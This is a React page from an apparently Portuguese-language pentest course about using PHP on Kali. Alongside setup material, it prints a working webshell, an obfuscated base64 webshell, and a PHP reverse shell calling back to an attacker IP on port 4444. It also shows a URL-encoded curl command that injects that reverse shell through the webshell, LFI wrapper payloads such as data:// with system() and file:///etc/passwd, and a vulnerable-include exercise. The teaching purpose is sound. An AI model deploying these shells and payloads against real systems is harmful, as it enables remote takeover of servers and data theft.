import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PHP() {
  return (
    <PageContainer
      title="PHP no Kali"
      subtitle="Quick servers para entrega de payload, php-fpm para hospedar lab vulnerável e webshells educacionais para entender RCE."
      difficulty="intermediario"
      timeToRead="17 min"
    >
      <h2>Por que PHP ainda importa em pentest</h2>
      <p>
        Mesmo em 2026, ~75% dos sites server-side rodam PHP. Wordpress, Joomla,
        Laravel, phpMyAdmin, Magento — alvos diários. Saber operar PHP no Kali
        significa: subir <code>php -S</code> em 1 segundo pra hospedar um
        payload que a vítima vai baixar, montar lab vulnerável idêntico ao
        target, e entender por dentro como webshells e LFI funcionam.
      </p>

      <h2>Instalar PHP 8.x</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y php php-cli php-fpm php-curl php-mysql php-xml php-mbstring php-zip php-gd",
            out: `Setting up php8.3-cli (8.3.6-1) ...
Setting up php8.3-fpm (8.3.6-1) ...
Setting up php-cli (2:8.3+93) ...`,
            outType: "info",
          },
          {
            cmd: "php -v",
            out: `PHP 8.3.6 (cli) (built: Apr  9 2025 12:21:41) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.3.6, Copyright (c) Zend Technologies
    with Zend OPcache v8.3.6, Copyright (c), by Zend Technologies`,
            outType: "success",
          },
          {
            comment: "lista extensões carregadas",
            cmd: "php -m | head -20",
            out: `[PHP Modules]
calendar
Core
ctype
curl
date
dom
exif
FFI
fileinfo
filter
ftp
gd
hash
iconv
json
libxml
mbstring
mysqli
mysqlnd
openssl`,
            outType: "info",
          },
          {
            cmd: "php --ini | head -5",
            out: `Configuration File (php.ini) Path: /etc/php/8.3/cli
Loaded Configuration File:         /etc/php/8.3/cli/php.ini
Scan for additional .ini files in: /etc/php/8.3/cli/conf.d
Additional .ini files parsed:      /etc/php/8.3/cli/conf.d/10-mysqlnd.ini`,
            outType: "default",
          },
        ]}
      />

      <h2>php -S — webserver instantâneo</h2>
      <p>
        O comando mais útil do PHP em campo. Sobe HTTP server em uma linha,
        sem Apache/Nginx, ótimo para hospedar payload em rede interna durante
        engagement.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "serve a pasta atual em todas as interfaces, porta 8888",
            cmd: "php -S 0.0.0.0:8888",
            out: `[Fri Apr  3 17:42:11 2026] PHP 8.3.6 Development Server (http://0.0.0.0:8888) started`,
            outType: "success",
          },
          {
            cmd: "(em outra shell) curl -s http://localhost:8888/payload.exe -o /tmp/p.exe && file /tmp/p.exe",
            out: "/tmp/p.exe: PE32+ executable (console) x86-64, for MS Windows",
            outType: "info",
          },
          {
            comment: "logs em tempo real apareceram no primeiro terminal:",
            cmd: "(no terminal do php -S)",
            out: `[Fri Apr  3 17:42:34 2026] 192.168.10.55:51230 [200]: GET /payload.exe`,
            outType: "warning",
          },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "se passar arquivo .php, ele EXECUTA (rota fallback)",
            cmd: "echo '<?php phpinfo(); ?>' > /tmp/web/info.php && php -S 0.0.0.0:8888 -t /tmp/web",
            out: `[Fri Apr  3 17:50:11 2026] PHP 8.3.6 Development Server (http://0.0.0.0:8888) started`,
            outType: "info",
          },
          {
            comment: "router script para SPAs ou tratativa de 404",
            cmd: "php -S 0.0.0.0:8888 -t /tmp/web router.php",
            out: "(router.php é executado pra cada request — ideal pra mock de API)",
            outType: "muted",
          },
        ]}
      />

      <h2>php-fpm + Nginx</h2>
      <p>
        Para production-like (lab realista), Nginx ou Apache delega execução
        de PHP ao <strong>php-fpm</strong> via FastCGI:
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo systemctl enable --now php8.3-fpm",
            out: "Created symlink /etc/systemd/system/multi-user.target.wants/php8.3-fpm.service",
            outType: "success",
          },
          {
            cmd: "sudo systemctl status php8.3-fpm --no-pager -l | head -8",
            out: `● php8.3-fpm.service - The PHP 8.3 FastCGI Process Manager
     Loaded: loaded (/usr/lib/systemd/system/php8.3-fpm.service; enabled)
     Active: active (running) since Fri 2026-04-03 17:55:11 -0300; 3s ago
   Main PID: 24812 (php-fpm8.3)
     Status: "Processes active: 0, idle: 2, Requests: 0, slow: 0, Traffic: 0req/sec"
      Tasks: 3 (limit: 9418)
     CGroup: /system.slice/php8.3-fpm.service
             ├─24812 "php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)"`,
            outType: "info",
          },
          {
            cmd: "ls /run/php/",
            out: "php8.3-fpm.pid  php8.3-fpm.sock",
            outType: "default",
          },
        ]}
      />

      <CodeBlock
        language="nginx"
        title="snippet nginx para passar PHP ao php-fpm"
        code={`location ~ \\.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.3-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}`}
      />

      <h2>php.ini — flags que importam pra ataque/defesa</h2>
      <CommandTable
        title="diretivas-chave"
        variations={[
          { cmd: "disable_functions=", desc: "Lista de funções proibidas (system, exec, shell_exec, popen, passthru, ...).", output: "Bypass clássico via mail() + LD_PRELOAD ou PHP wrappers." },
          { cmd: "open_basedir=/var/www", desc: "Restringe filesystem ao path indicado.", output: "Bypass via cURL file:// ou symlink em sessions." },
          { cmd: "allow_url_include=Off", desc: "Bloqueia include('http://...').", output: "Default Off em PHP moderno." },
          { cmd: "allow_url_fopen=On", desc: "fopen suporta URLs.", output: "Útil para SSRF via PHP wrappers." },
          { cmd: "expose_php=Off", desc: "Esconde header X-Powered-By: PHP/x.y.", output: "Defesa: dificulta fingerprint." },
          { cmd: "display_errors=Off", desc: "Não vaza paths/erros pro browser.", output: "Em prod sempre Off; lab/dev On." },
          { cmd: "upload_max_filesize=2M", desc: "Tamanho max de upload.", output: "Aumente pra entregar payload grande." },
          { cmd: "post_max_size=8M", desc: "Tamanho max do body POST.", output: "Tem que ser >= upload_max_filesize." },
          { cmd: "memory_limit=128M", desc: "RAM por request.", output: "" },
          { cmd: "session.save_path=/var/lib/php/sessions", desc: "Onde sessões ficam (filesystem).", output: "Vetor: leitura de outros usuários se permissões frouxas." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "php -i | grep -E '^(disable_functions|open_basedir|allow_url|expose_php)'",
            out: `disable_functions => no value => no value
allow_url_fopen => On => On
allow_url_include => Off => Off
expose_php => On => On`,
            outType: "warning",
          },
        ]}
      />

      <h2>Composer — package manager</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y composer",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "composer --version",
            out: "Composer version 2.7.7 2024-06-10 22:11:12",
            outType: "info",
          },
          {
            cmd: "composer require guzzlehttp/guzzle",
            out: `Using version ^7.9 for guzzlehttp/guzzle
./composer.json has been created
Loading composer repositories with package information
Updating dependencies
Lock file operations: 6 installs, 0 updates, 0 removals
Generating autoload files`,
            outType: "success",
          },
        ]}
      />

      <h2>Webshell PHP — anatomia (educacional)</h2>
      <CodeBlock
        language="php"
        title="webshell mínimo (cmd.php)"
        code={`<?php
// EDUCACIONAL — não exponha em produção
if (isset($_GET['c'])) {
    $output = shell_exec($_GET['c'] . ' 2>&1');
    header('Content-Type: text/plain');
    echo $output;
} else {
    echo "<form><input name=c size=80><button>run</button></form>";
}`}
      />

      <CodeBlock
        language="php"
        title="webshell ofuscado (mais comum em CTF)"
        code={`<?php
$f = base64_decode("c3lzdGVt");          // "system"
$x = base64_decode($_REQUEST['z']);       // base64 do comando
$f($x);
?>`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "atacante usa ofuscado",
            cmd: "curl -s 'http://lab.local/cmd.php?z=aWQ='",
            out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
            outType: "error",
          },
        ]}
      />

      <AlertBox type="danger" title="Webshell exposta = invasão">
        <p>
          Os exemplos acima existem para você ENTENDER porquê detectores
          procuram por <code>eval()</code>, <code>base64_decode()</code>,{" "}
          <code>$_GET</code> dentro de <code>system()</code>. Em pentest com
          escopo, suba shell em VM dedicada e remova ao final do engagement.
          Em prod = crime.
        </p>
      </AlertBox>

      <h2>Reverse shell PHP</h2>
      <CodeBlock
        language="php"
        title="reverse shell uma linha"
        code={`<?php
// LHOST e LPORT do atacante
$sock = fsockopen("10.10.14.5", 4444);
$proc = proc_open("/bin/sh -i", [
    0 => $sock, 1 => $sock, 2 => $sock
], $pipes);`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "no atacante",
            cmd: "rlwrap nc -lvnp 4444",
            out: `Listening on 0.0.0.0 4444
Connection received on 192.168.56.20 51244`,
            outType: "warning",
          },
          {
            comment: "via cmd.php exploitando RCE",
            cmd: "curl -s 'http://target/cmd.php?c=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.14.5%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27'",
            out: "(no listener vem o shell)",
            outType: "muted",
          },
          {
            comment: "shell upgrade após callback",
            cmd: "(no listener) python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            out: "www-data@target:/var/www/html$",
            outType: "info",
          },
        ]}
      />

      <h2>PHP wrappers — leitura/exec via LFI</h2>
      <CommandTable
        title="wrappers úteis em LFI"
        variations={[
          { cmd: "php://filter/convert.base64-encode/resource=index.php", desc: "Lê o source do PHP em base64.", output: "Funciona mesmo se PHP executa o arquivo normalmente." },
          { cmd: "php://input", desc: "Conteúdo do request body.", output: "Combinado com LFI = RCE se você POST com <?php ...?>." },
          { cmd: "data://text/plain,<?php system($_GET[1]);?>", desc: "Inline data.", output: "Requer allow_url_include=On." },
          { cmd: "expect://id", desc: "Executa via ext-expect.", output: "Raro mas devastador." },
          { cmd: "phar://uploads/foto.jpg/teste", desc: "Trigger de unserialize via Phar.", output: "Vetor de PHP Object Injection sem POST direto." },
          { cmd: "file:///etc/passwd", desc: "Leitura local explícita.", output: "Mesmo que o include() simples." },
          { cmd: "zip://uploads/x.zip#shell.php", desc: "Lê arquivo dentro de zip.", output: "Útil em upload bypass." },
        ]}
      />

      <h2>Lab Wordpress vulnerável em 30s</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "docker run -d --name wp -p 8090:80 -e WORDPRESS_DB_HOST=db -e WORDPRESS_DB_PASSWORD=root --link wpdb:db wordpress:5.0",
            out: "(WP 5.0 = vulnerável a CVE-2019-8942 — author RCE)",
            outType: "warning",
          },
          {
            cmd: "wpscan --url http://localhost:8090 --enumerate p,t,u,vp,vt --api-token <token>",
            out: `[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 |   Found By: Rss Generator (Passive Detection)
[!] 47 vulnerabilities identified:
[!] Title: WordPress 5.0 Authenticated File Upload to RCE
    Fixed in: 5.0.1
[+] enumerating users via author parameter:
 | admin
 | editor`,
            outType: "error",
          },
        ]}
      />

      <PracticeBox
        title="Quick payload server + LFI exploitation"
        goal="Hospedar um payload com php -S e simular leitura de arquivo via php://filter."
        steps={[
          "Crie /tmp/srv com vuln.php que faz include($_GET['p']).",
          "Suba php -S na 8000.",
          "Use curl com php://filter para extrair source do próprio vuln.php em base64.",
          "Decode e veja o source vazado.",
        ]}
        command={`mkdir -p /tmp/srv
cat > /tmp/srv/vuln.php <<'EOF'
<?php
$secret = "FLAG{leak_via_filter}";
include($_GET['p']);
EOF

cd /tmp/srv && php -S 0.0.0.0:8000 &
sleep 1

curl -s "http://localhost:8000/vuln.php?p=php://filter/convert.base64-encode/resource=vuln.php" | base64 -d`}
        expected={`<?php
$secret = "FLAG{leak_via_filter}";
include($_GET['p']);`}
        verify="Você extraiu o source do PHP que o servidor estava executando. Padrão clássico de LFI moderno."
      />

      <AlertBox type="info" title="Múltiplas versões: php-switch / update-alternatives">
        <p>
          Quando o lab pede PHP 5.6 (Joomla legacy) e o seu Kali é 8.3,
          instale ambos via repositório <code>deb.sury.org</code> e troque com{" "}
          <code>sudo update-alternatives --config php</code>. Cada versão tem
          seu próprio <code>php.ini</code> e <code>fpm.sock</code>.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
